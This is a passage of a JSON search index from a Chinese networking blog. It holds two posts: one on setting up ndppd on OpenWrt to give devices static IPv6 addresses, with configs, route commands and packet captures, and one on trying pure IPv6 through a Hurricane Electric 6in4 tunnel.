<p>\u4f46\u5176\u5b9e\u4e0a\u9762\u7684\u9700\u6c42\u662f\u53ef\u4ee5\u5b9e\u73b0\u7684\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u53eb\u505a NDP proxy \u7684\u8f6f\u4ef6\u3002</p>","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#ndppd-\u914d\u7f6e","title":"ndppd \u914d\u7f6e","text":"<p>NDP(neighbor discovery protocol) \u662f ipv6 \u4e2d\u7684\u4e00\u5957\u534f\u8bae\uff0c\u8d1f\u8d23 ipv6 \u7684\uff1a\u5730\u5740\u81ea\u52a8\u914d\u7f6e\u3001\u90bb\u5c45\u68c0\u6d4b\u3001ARP\u3001\u5730\u5740\u51b2\u7a81\u68c0\u6d4b\u7b49\u3002</p> <p>\u80cc\u666f\u4e2d\u884c\u4e0d\u901a\u7684\u539f\u56e0\u5728\u4e8e WAN \u4e0d\u4f1a\u54cd\u5e94\u975e\u81ea\u5df1 ip \u7684 NS \u62a5\u6587\u3002\u5bf9\u4e8e\u63a5\u53e3\u4e0a\u6709\u7684 ip \u5730\u5740\uff0c\u5185\u6838\u4f1a\u5e2e\u6211\u4eec\u54cd\u5e94 NS\u3002\u5bf9\u4e8e\u5176\u5b83\u7684 ip\uff0c\u5219\u9700\u8981\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u6765\u8bbe\u7f6e\u54cd\u5e94\u3002\u6211\u4eec\u9700\u8981\u7528\u5230\u7684\u4fbf\u662f\u4e00\u4e2a\u53eb ndppd(ndp proxy daemon) \u7684\u8f6f\u4ef6\u3002</p> <p>\u8be5\u8f6f\u4ef6\u5728 openwrt \u4e0a\u4e5f\u6709\uff0c\u76f4\u63a5\u5b89\u88c5\u5373\u53ef</p> <pre><code>opkg install ndppd\n</code></pre> <p>\u8f6f\u4ef6\u7684\u914d\u7f6e\u5982\u4e0b\u5f88\u7b80\u5355</p> <pre><code>proxy br-wan {\n   # router yes\n   timeout 500\n   ttl 30000\n\n   rule 2001:da8:d800:336::beef:aa00/120 {\n   static\n   }\n}\n</code></pre> <p>\u914d\u7f6e\u9009\u9879\u8bf4\u660e\uff1a</p> <ul> <li><code>proxy &lt;interface&gt;</code>\u8bbe\u7f6e\u4e00\u4e2a\u76d1\u542c\u5668\u3002\u76d1\u542c\u6307\u5b9a\u63a5\u53e3\u4e0a\u7684 NS\uff0c\u5e76\u5339\u914d rule \u51b3\u5b9a\u662f\u5426\u54cd\u5e94\u3002\u53ef\u4ee5\u8bbe\u7f6e\u591a\u4e2a proxy\u3002</li> <li>rule \u53ef\u4ee5\u914d\u7f6e\u51e0\u79cd\u54cd\u5e94\u6a21\u5f0f<ul> <li><code>static</code>\uff1a\u53ea\u8981\u5339\u914d\u5230\u5730\u5740\uff0c\u5c31\u54cd\u5e94</li> <li><code>iface &lt;interface&gt;</code>\uff1a\u4f1a\u5c06 NS \u5728\u6307\u5b9a\u7684\u63a5\u53e3\u4e0a\u8f6c\u53d1\uff0c\u6536\u5230 NA \u65f6\u624d\u54cd\u5e94\u3002\u76f8\u5f53\u4e8e\u786e\u4fdd\u6307\u5b9a\u63a5\u53e3\u4e0b\u9762\u8be5\u5730\u5740\u8bbe\u5907\u662f\u5b58\u5728\u7684\u624d\u54cd\u5e94</li> <li><code>auto</code>\uff1a\u7c7b\u4f3c\u4e8e iface\uff0c\u4f46\u662f ndppd \u81ea\u52a8\u6839\u636e<code>/proc/net/ipv6_route</code>\u51b3\u5b9a\u63a5\u53e3</li> </ul> </li> <li><code>router</code>\uff1aNA \u4e2d\u662f\u5426\u5305\u542b route flag\u3002\u8868\u660e\u672c\u8bbe\u5907\u662f\u53f0\u8def\u7531\u5668</li> </ul> <p>\u8fd9\u91cc\u6211\u4eec\u624b\u52a8\u4fdd\u7559\u4e86 120 \u4f4d\u7684\u4e00\u6bb5 v6 \u5730\u5740\uff0c\u5269\u4f59 8 \u4f4d\u53ef\u4ee5\u5206\u914d\u7ed9 255 \u4e2a\u8bbe\u5907\u3002\u4f7f\u7528 static \u5373\u53ef\u3002</p> <p>\u542f\u52a8\u8fd0\u884c ndppd</p> <pre><code>service ndppd enable\nservice ndppd start\n</code></pre>","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#\u914d\u7f6e\u8def\u7531","title":"\u914d\u7f6e\u8def\u7531","text":"<p>ndppd \u76f8\u5f53\u4e8e\u8ba9 wan \u53e3\u4f2a\u88c5\u6709\u4fdd\u7559\u7684\u4e00\u6bb5 v6 \u5730\u5740\u3002\u4e0a\u7ea7\u8def\u7531\u5668\u5c06\u5305\u53d1\u6765\u540e\uff0c\u9700\u8981 forward \u7ed9\u771f\u6b63\u7684\u8bbe\u5907\u3002</p> <p>\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u6dfb\u52a0\u8def\u7531\uff1a</p> <pre><code>ip -6 ro add 2001:da8:d800:336::beef:aaaa via fe80::6818:12ff:fec3:7f7f dev br-lan\n</code></pre> <p>\u5176\u4e2d via \u540e\u7684\u5730\u5740\u662f\u5bf9\u5e94\u8bbe\u5907\u7684 v6 \u672c\u5730\u94fe\u8def\u5730\u5740\u3002\u8fd9\u79cd\u5199\u6cd5\u628a\u8bbe\u5907\u5f53\u4f5c\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u8def\u7531\u5668\u5c06\u76ee\u7684\u5730\u5740\u7684\u5305\u53d1\u9001\u7ed9\u5bf9\u9762\u8bbe\u5907\u3002</p> <p>\u53e6\u4e00\u79cd\u5199\u6cd5\u4e5f\u662f\u53ef\u884c\u7684\u3002\u8fd9\u79cd\u5199\u6cd5\u8868\u793a\u76ee\u7684\u5730\u5740\u4f4d\u4e8e br-lan \u63a5\u53e3\u6240\u5728\u5e7f\u64ad\u57df\u3002\u8def\u7531\u5668\u53ef\u4ee5\u628a\u5305\u76f4\u63a5\u53d1\u9001\u7ed9\u5bf9\u5e94\u8bbe\u5907\uff08\u4e2d\u9014\u8fd8\u6d89\u53ca ARP \u8fc7\u7a0b\uff09\u3002</p> <pre><code>ip -6 ro add 2001:da8:d800:336::beef:aaaa dev br-lan\n</code></pre> <p>onlink \u9009\u9879</p> <p>\u5982\u679c\u4e0a\u8ff0\u547d\u4ee4\u5931\u8d25\uff0c\u53ef\u4ee5\u6dfb\u52a0onlink\u9009\u9879\u3002\u4e0a\u8ff0\u547d\u4ee4\u4f1a\u68c0\u67e5\u76ee\u7684\u5730\u5740\u662f\u5426\u4f4d\u4e8ebr-lan\u7684\u5b50\u7f51\uff0c\u800conlink\u7528\u4e8e\u907f\u514d\u8be5\u68c0\u67e5\u3002</p> <p>\u8def\u7531\u8868\u5bf9\u6bd4</p> <pre><code>2001:da8:d800:336::beef:aaaa via fe80::b8c5:64ff:fe4b:4327 dev br-lan proto static metric 1024 pref medium\n2001:da8:d800:336::beef:aaab dev br-lan metric 1024 onlink pref medium\n</code></pre>","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#\u6548\u679c","title":"\u6548\u679c","text":"<p>\u963f\u91cc ecs \u4e0a mtr \u6548\u679c </p> <p>tcpdump \u6293\u5230\u7684 NS\uff0cNA</p> <pre><code>2024-02-27 15:22:27.295778 IP6 2001:da8:d800:336::279 &gt; ff02::1:ffef:aaaa: ICMP6, neighbor solicitation, who has 2001:da8:d800:336::beef:aaaa, length 32\n2024-02-27 15:22:27.295880 IP6 2001:da8:d800:336::1c &gt; 2001:da8:d800:336::279: ICMP6, neighbor advertisement, tgt is 2001:da8:d800:336::beef:aaaa, length 32\n2024-02-27 15:22:27.300040 IP6 fe80::3ecd:57ff:fe33:bb01 &gt; ff02::1:ffef:aaaa: ICMP6, neighbor solicitation, who has 2001:da8:d800:336::beef:aaaa, length 32\n2024-02-27 15:22:27.300045 IP6 fe80::3ecd:57ff:fe33:bb01 &gt; ff02::1:ffef:aaaa: ICMP6, neighbor solicitation, who has 2001:da8:d800:336::beef:aaaa, length 32\n2024-02-27 15:22:27.300120 IP6 fe80::216:3eff:fee2:4e72 &gt; fe80::3ecd:57ff:fe33:bb01: ICMP6, neighbor advertisement, tgt is 2001:da8:d800:336::beef:aaaa, length 32\n2024-02-27 15:22:27.300153 IP6 fe80::216:3eff:fee2:4e72 &gt; fe80::3ecd:57ff:fe33:bb01: ICMP6, neighbor advertisement, tgt is 2001:da8:d800:336::beef:aaaa, length 32\n</code></pre>","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#ndppd-\u4e0d\u54cd\u5e94-ns","title":"ndppd \u4e0d\u54cd\u5e94 NS","text":"<p><code>tcpdump -ni eth0</code>\u6293\u5230\u4e86\u6307\u5b9a ip \u7684 NS\uff0c\u4f46\u662f ndppd \u5c31\u662f\u4e0d\u54cd\u5e94\u3002</p> <p>p.s. 1\uff09\u521a\u5f00\u59cb\u4ee5\u4e3a\u662f ndppd \u6ca1\u6709\u8fd0\u884c\uff0c\u56e0\u4e3a service \u663e\u793a ndppd \u662f stopped \u7684\uff0c\u4f46\u5176\u5b9e ps \u662f\u80fd\u770b\u5230 ndppd \u8fdb\u7a0b\u7684\u30022\uff09\u5373\u4f7f\u547d\u4ee4\u884c\u624b\u52a8\u8fd0\u884c ndppd<code>ndppd -c /etc/ndppd.conf -v</code>\uff0c\u5f00\u542f verbose \u6a21\u5f0f\uff0c\u4ecd\u7136\u662f\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa</p> <p>\u95ee\u9898\u5728\u4e8e<code>eth0</code>\u662f\u8fde\u63a5\u5728<code>br-wan</code>\u4e0a\u7684\u3002\u8fd9\u6d89\u53ca\u5230 bridge \u7684\u539f\u7406\uff0c\u5305\u4ece eth0 \u63a5\u53e3\u8fdb\u6765\u540e\uff0c\u5728\u8fdb\u5165\u7f51\u7edc\u6808\u4e4b\u524d\u5c31\u4f1a\u8fdb\u5165 bridge \u7684\u7f51\u7edc\u6808\u5904\u7406\u3002\u5bf9\u4e8e eth0 \u6765\u8bf4\uff0c\u662f\u6ca1\u6709\u5305\u8fdb\u5165\u7f51\u7edc\u6808\u7684\u3002</p> <p>\u56e0\u6b64\u9700\u8981\u628a ndppd \u7684\u914d\u7f6e\u6539\u4e3a br-wan\u3002</p>","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#\u9700\u8981-restart-ndppd","title":"\u9700\u8981 restart ndppd","text":"<p>ndppd \u4e0d\u751f\u6548\uff0crestart \u540e\u624d\u751f\u6548 \u9700\u8981\u7814\u7a76\u3002</p>","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#ndppd-\u4e0d\u54cd\u5e94-ns\u914d\u7f6e\u6587\u4ef6\u9519\u8bef","title":"ndppd \u4e0d\u54cd\u5e94 NS\uff08\u914d\u7f6e\u6587\u4ef6\u9519\u8bef\uff09","text":"<p>king6 \u4e0a ndppd \u662f\u53ef\u4ee5\u770b\u5230 write_advert \u5bf9\u5e94\u53d1\u51fa NA \u7684</p> <pre><code>(debug) iface::read() len=86\n(debug) iface::read_solicit() saddr=2001:da8:d800:336::1, daddr=ff02::1:ffef:aa01, len=86\n(debug) proxy::handle_solicit() saddr=2001:da8:d800:336::1, taddr=2001:da8:d800:336::beef:aa01\n(debug) checking 2001:da8:d800:336::beef:aa00/120 against 2001:da8:d800:336::beef:aa01\n(debug) session::create() pr=a5bba600, saddr=2001:da8:d800:336::1, daddr=ff02::1:ffef:aa01, taddr=2001:da8:d800:336::beef:aa01 =a5bbbec0\n(debug) iface::write_advert() daddr=2001:da8:d800:336::1, taddr=2001:da8:d800:336::beef:aa01\n(debug) iface::write() daddr=2001:da8:d800:336::1, len=32\n(debug) session::~session() this=a5bbbec0\n</code></pre> <p>\u6211\u7684 op1</p> <pre><code>(debug) checking 2001:da8:d800:336::ae86:0/120 against fe80::ee8e:b5ff:febc:304f\n(debug) iface::read() len=86\n(debug) iface::read_solicit() saddr=2001:da8:d800:336::1, daddr=ff02::1:ffef:aa01, len=86\n(debug) proxy::handle_solicit() saddr=2001:da8:d800:336::1, taddr=2001:da8:d800:336::beef:aa01\n(debug) checking 2001:da8:d800:336::ae86:0/120 against 2001:da8:d800:336::beef:aa01\n(debug) iface::read() len=86\n(debug) iface::read_solicit() saddr=fe80::ea63:ab11:ef7c:419, daddr=ff02::1:ff61:321d, len=86\n(debug) proxy::handle_solicit() saddr=fe80::ea63:ab11:ef7c:419, taddr=fe80::1262:e5ff:fe61:321d\n</code></pre> <p>\u53d1\u73b0\u95ee\u9898\u5728\u4e8e\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u4e2d\u4e00\u4e2a\u63a5\u53e3\u53ea\u80fd\u5199\u4e00\u4e2a\uff0c\u591a\u4e2a\u5730\u5740\u91cd\u590d\u591a\u4e2a rule \u5373\u53ef\u3002</p>","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#\u9700\u8981-ping-\u4e00\u4e0b\u89e6\u53d1-ns-\u624d\u80fd\u901a\u7f51","title":"\u9700\u8981 ping \u4e00\u4e0b\u89e6\u53d1 NS \u624d\u80fd\u901a\u7f51","text":"<p>\u5c1d\u8bd5\u7ed9 br-lan \u6dfb\u52a0\u4e00\u4e2a\u65b0\u5730\u5740 <code>2001:da8:d800:336::beef:aa03</code></p> <pre><code>root@op1 \u279c  ~ ping -I 2001:da8:d800:336::beef:aa03 2408:4002:102f:7600::1\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u4ece wan \u53e3\u53d1\u51fa\u53bb\u4e86\uff0c\u4f46\u662f\u5b66\u6821\u6ca1\u6709\u5bf9\u5176\u8f6c\u53d1</p> <pre><code>22:58:52.387671 br-wan Out IP6 2001:da8:d800:336::beef:aa03 &gt; 2408:4002:102f:7600::1: ICMP6, echo request, id 19045, seq 33, length 64\n22:58:52.387674 eth0  Out IP6 2001:da8:d800:336::beef:aa03 &gt; 2408:4002:102f:7600::1: ICMP6, echo request, id 19045, seq 33, length 64\n</code></pre> <p>\u60f3\u529e\u6cd5\u89e6\u53d1\u4e00\u6b21 ns</p> <ul> <li>\u53ef\u4ee5 ping \u5b66\u6821\u7f51\u5173</li> <li>\u53ef\u4ee5\u4ece\u5916\u7f51 ping \u8be5 ipv6</li> </ul> <pre><code>2024-04-26 23:01:58.974842 IP6 2001:da8:d800:336::1 &gt; ff02::1:ffef:aa03: ICMP6, neighbor solicitation, who has 2001:da8:d800:336::beef:aa03, length 32\n2024-04-26 23:01:58.974947 IP6 2001:da8:d800:336::1c &gt; 2001:da8:d800:336::1: ICMP6, neighbor advertisement, tgt is 2001:da8:d800:336::beef:aa03, length 32\n</code></pre> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u4e86</p> <pre><code>23:03:12.080272 br-wan Out IP6 2001:da8:d800:336::beef:aa03 &gt; 2408:4002:102f:7600::1: ICMP6, echo request, id 20919, seq 4, length 64\n23:03:12.080274 eth0  Out IP6 2001:da8:d800:336::beef:aa03 &gt; 2408:4002:102f:7600::1: ICMP6, echo request, id 20919, seq 4, length 64\n23:03:12.096017 eth0  In  IP6 2408:4002:102f:7600::1 &gt; 2001:da8:d800:336::beef:aa03: ICMP6, echo reply, id 20919, seq 4, length 64\n23:03:12.096017 br-wan In  IP6 2408:4002:102f:7600::1 &gt; 2001:da8:d800:336::beef:aa03: ICMP6, echo reply, id 20919, seq 4, length 64\n</code></pre>","tags":["ipv6","ndppd"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/02/27/%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%88%86%E9%85%8D%E9%9D%99%E6%80%81v6-ndppd/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>ndppd/README at 0.2.5 \u00b7 DanielAdolfsson/ndppd (github.com)</li> </ul>","tags":["ipv6","ndppd"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/","title":"\u4f53\u9a8c\u7eaf IPv6 \u7f51\u7edc","text":"<p>\u8d77\u56e0\u662f\u7ed9 wolf \u7684\u5f00\u53d1\u8005\u63d0\u5efa\u8bae\u65f6\uff0c\u6d89\u53ca\u5230\u4e86\u901a\u8fc7 HE(Hurricane Electric) \u63d0\u4f9b\u7684 6in4 \u670d\u52a1\u63a5\u5165 ipv6 \u7f51\u7edc \u3002\u65e2\u7136\u7ed9\u522b\u4eba\u4ecb\u7ecd\u4e86\uff0c\u611f\u89c9\u81ea\u5df1\u4e0d\u80fd\u6ca1\u6709\u5b9e\u64cd\u8fc7\uff0c\u56e0\u6b64\u5c31\u5c1d\u8bd5\u5728\u81ea\u5df1\u7684\u7f51\u7edc\u8fde\u5165 HE\u3002</p> <pre><code>I want to streaming over ipv6 network. However wolf only listen on ipv4 for now.\n\nABeltramo \u2014 2024/10/06 23:42\nProbably not, I don't have IPv6 in my LAN/WAN so not sure how to implement it.. Might be worth opening up an issue in Github!\n\nTheRainstorm \u2014 2024/10/06 23:49\nDoesn't your ISP provide IPv6? Otherwise, enabling IPv6 should only require enabling it on the home router.\n\nABeltramo \u2014 \u6628\u592900:59\nNope, no IPv6 over here..\n\nTheRainstorm \u2014 \u6628\u592914:56\nIf you want to try out IPv6, there's another way to get the full IPv6 experience, which is through a 6in4 tunnel. Some free services, like Hurricane Electric, allow you to connect to the IPv6 network. However, this requires you to have a public IPv4 address and a router that supports 6in4 functionality (if you're using open-source router firmware like OpenWRT, it is supported by default).\n\nI can provide you with some useful links:\nhttps://www.youtube.com/watch?v=LJPXz8eA3b8&amp;t=64s\nhttps://openwrt.org/docs/guide-user/network/ipv6/ipv6tunnel-luci\n\nABeltramo \u2014 \u6628\u592915:02\nThanks, that's probably my best bet on trying IPv6. I have a WAN IPv4 IP and I use OPNSense in my custom router so it should be possible.\nI'm working on a few other bits at the moment, not sure when I'll have the time to look properly into this\n</code></pre> <p>\u63a5\u7740\u610f\u8bc6\u5230\u5230\uff0c\u65e2\u7136\u6211\u53ef\u4ee5 6in4 \u5230\u56fd\u5916\uff0c\u5c82\u4e0d\u662f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u56fd\u5916 v6 \u7f51\u7ad9\uff1f\u4e0d\u8fc7\u7531\u4e8e\u53ea\u6709 v6 \u5730\u5740\uff0c\u56e0\u6b64\u53ea\u80fd\u8bbf\u95ee\u7eaf ipv6 \u7f51\u7ad9\u3002\u4e8e\u662f\u6211\u5c31\u597d\u5947\uff0c\u5728 2024 \u5e74\u7eaf ipv6 \u7684\u4f53\u9a8c\u662f\u600e\u4e48\u6837\u7684\uff0c\u56e0\u6b64\u5c31\u6709\u4e86\u8fd9\u7bc7\u535a\u5ba2\u3002</p> <p>\u79c0\u4e0b\u6700\u540e\u5927\u5927\u7684 No IPv4 address detected</p> <p></p> <p>\u5e76\u4e14 /48 \u7684\u524d\u7f00\uff0c\u6211\u53ef\u4ee5\u5212\u5206 65536 \u4e2a\u5b50\u7f51\uff01</p> <p>\u6709\u7528\u94fe\u63a5</p> <ul> <li>ipw.cn</li> <li>ipv6.test-ipv6.com</li> </ul>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#\u7eaf-ipv6-\u7f51\u7ad9\u4f53\u9a8c\u6392\u884c\u699c","title":"\u7eaf IPv6 \u7f51\u7ad9\u4f53\u9a8c\u6392\u884c\u699c","text":"<p>\u8fd9\u91cc\u662f\u6700\u540e\u4f7f\u7528\u624b\u673a\u63a5\u5165\u4e00\u4e2a\u7eaf ipv6 \u7f51\u7edc\u540e\u7684\u4f53\u9a8c</p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#\u56fd\u5916","title":"\u56fd\u5916","text":"<p>google \u662f\u771f nb\uff0cgoogle \u641c\u7d22\uff0cyoutube \u90fd\u652f\u6301 ipv6\uff0c\u5e76\u4e14\u4f53\u9a8c\u8fd8\u4e0d\u9519\uff0c\u641c\u7d22\u54cd\u5e94\u5f88\u5feb\uff0c\u80fd\u591f\u63d0\u793a\u63a8\u8350\u8bcd\uff0cyoutube \u80fd\u89c2\u770b 1080p \u89c6\u9891\uff08\u8df3\u8f6c\u5927\u6982\u7f13\u51b2 4s\uff09\u3002</p> <p>\u5176\u4e2d youtube \u521a\u5f00\u59cb\u56fe\u6807\u663e\u793a\u6709\u95ee\u9898\uff0c\u540e\u6765\u5c31\u5b8c\u5168\u6b63\u5e38\u4e86\u3002</p> <p></p> <p>\u652f\u6301</p> <ul> <li>google \u7cfb\uff08google \u641c\u7d22\uff0cYouTube.com\uff09</li> <li>telegram</li> </ul> <p>\u4e0d\u652f\u6301</p> <ul> <li>discord</li> <li>x.com</li> <li>reddit</li> <li>twitch</li> <li>instagram</li> </ul>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#\u56fd\u5185","title":"\u56fd\u5185","text":"<p>\u6dd8\u5b9d\u7cfb\u4e5f\u662f\u771f nb\uff0c\u624b\u673a app \u6d41\u7545\u7684\u4e00\u7b14\uff0c\u57fa\u672c\u7528\u4e0d\u51fa\u533a\u522b\u3002\u5e76\u4e14\u8f6f\u4ef6\u751a\u81f3\u4f1a\u68c0\u6d4b\u4f60\u7684 ip \u8ba9\u4f60\u5207\u6362\u5230\u5168\u7403\u5730\u533a</p> <p></p> <p>\u89c6\u9891\u7f51\u7ad9</p> <ul> <li>youku.com\uff1a\u4f18\u9177\u725b\u903c\uff0c\u56fd\u5185\u552f\u4e00\u4e00\u4e2a\u80fd\u591f\u4f7f\u7528\u7684\u89c6\u9891\u7f51\u7ad9</li> <li>B \u7ad9\u4e0d\u652f\u6301\uff08\u7f51\u9875\u624b\u673a app \u90fd\u4e0d\u884c\uff09\uff0c\u7f51\u4e0a\u597d\u50cf\u8bf4 CDN \u652f\u6301</li> <li>\u7231\u5947\u827a\u3001\u897f\u74dc\u89c6\u9891\u3001\u6296\u97f3\u90fd\u4e0d\u652f\u6301</li> </ul> <p>\u804a\u5929\u8f6f\u4ef6</p> <ul> <li>\u5fae\u4fe1\uff0cqq \u90fd\u652f\u6301</li> </ul> <p>\u8d2d\u7269</p> <ul> <li>\u652f\u4ed8\u5b9d\u4e5f\u652f\u6301<ul> <li>\u6dd8\u7968\u7968\u5c0f\u7a0b\u5e8f\u652f\u6301\uff0c\u4f46\u662f\u6709\u70b9\u5361</li> </ul> </li> <li>\u5fae\u4fe1</li> </ul> <p>\u8d44\u8baf</p> <ul> <li>\u652f\u6301<ul> <li>\u77e5\u4e4e</li> <li>\u5fae\u535a</li> </ul> </li> <li>\u4e0d\u652f\u6301<ul> <li>\u8d34\u5427</li> <li>\u5c0f\u7ea2\u4e66</li> <li>\u8c46\u74e3</li> </ul> </li> </ul>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#openwrt-he-tunnel-\u914d\u7f6e","title":"OpenWRT HE tunnel \u914d\u7f6e","text":"<p>\u8ba1\u5212\u662f\u901a\u8fc7 HE tunnel \u83b7\u5f97\u4e00\u4e2a IPv6 \u7684 PD \u524d\u7f00\uff08HE \u9ed8\u8ba4\u7ed9\u4e00\u4e2a 64\uff0c\u53ef\u4ee5\u7533\u8bf7\u4e00\u4e2a 48\uff09\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 LAN\uff0c\u4f5c\u4e3a RA server \u548c DHCPv6 server\uff0c\u4e3a lan \u5185\u6240\u6709\u8bbe\u5907\u5206\u914d ipv6 \u5730\u5740\u3002</p> <p></p> <p>\u6700\u540e\u6548\u679c </p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<p>https://www.youtube.com/watch?v=LJPXz8eA3b8 [OpenWrt Wiki] IPv6 with Hurricane Electric using LuCI</p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#\u5b89\u88c5\u4f9d\u8d56","title":"\u5b89\u88c5\u4f9d\u8d56","text":"<p>6in4 \u9700\u8981</p> <pre><code>opkg install 6in4\n</code></pre> <p>\u5982\u679c\u4f7f\u7528 PVE LXC \u5bb9\u5668\u642d\u5efa\u7684 openwrt\uff0cpve \u4e2d\u8fd8\u9700\u8981\u53e6\u5916 modprobe <code>sit, ip_tunnel</code> \u6a21\u5757 <pre><code>root@ryzen-pve \u279c  ~ lsmod | grep -E 'ipv6|sit|ip_tunnel|nf_conntrack_ipv6'\nsit                    36864  0\ntunnel4                12288  1 sit\nnf_reject_ipv6         24576  1 nft_reject_inet\nnf_defrag_ipv6         24576  1 nf_conntrack\nip_tunnel              32768  2 ip_gre,sit\n</code></pre></p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#6in4-\u63a5\u53e3\u914d\u7f6e","title":"6in4 \u63a5\u53e3\u914d\u7f6e","text":"<p>Advanced Setting \u4e2d\u4e0d\u52fe\u9009\u4f7f\u7528\u9ed8\u8ba4\u8def\u7531\uff0c\u907f\u514d\u8986\u76d6\u6389 WAN6 \u53e3\u7684\u9ed8\u8ba4\u8def\u7531\u3002</p> <p>Use default gateway: If unchecked, no default route is configured</p>","tags":["ipv6"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/10/07/%E4%BD%93%E9%AA%8C%E7%BA%AF%20IPv6%20%E7%BD%91%E7%BB%9C/#lan-\u63a5\u53e3\u8bbe\u7f6e","title":"lan \u63a5\u53e3\u8bbe\u7f6e","text":"<p>tunnel \u8d77\u6765\u540e\uff0c\u9700\u8981\u521b\u5efa\u4e00\u4e2a lan2 \u63a5\u53e3\uff0c\u4f5c\u4e3a ra server \u548c dhcpv6 server</p> <p>\u534f\u8bae\u9009\u62e9\u9759\u6001\u5730\u5740\uff0c\u548c\u6b63\u5e38 lan \u4e0d\u540c\u7684\u662f\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u6307\u5b9a ipv4 \u5730\u5740\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u6253\u9020\u4e00\u4e2a\u5b58 ipv4 \u73af\u5883\u3002\u56e0\u6b64 ipv4 server \u5565\u7684\u90fd\u4e0d\u9700\u8981\u52fe\u9009\u3002</p> <p>\u5206\u914d ipv6 prefix \u957f\u5ea6\u9009\u62e9 48\uff08\u5168\u90e8\u7528\u6389\uff09\uff0cprefix filter \u9009\u62e9\u4ece HE tunnel \u63a5\u53e3\u83b7\u5f97 </p> <p>\u4e0d\u8981\u5f00\u542f ipv4 dhcp server\uff0c\u9009\u62e9 ignore </p> <p>\u542f\u7528 ipv6 ra, dhcpv6 server 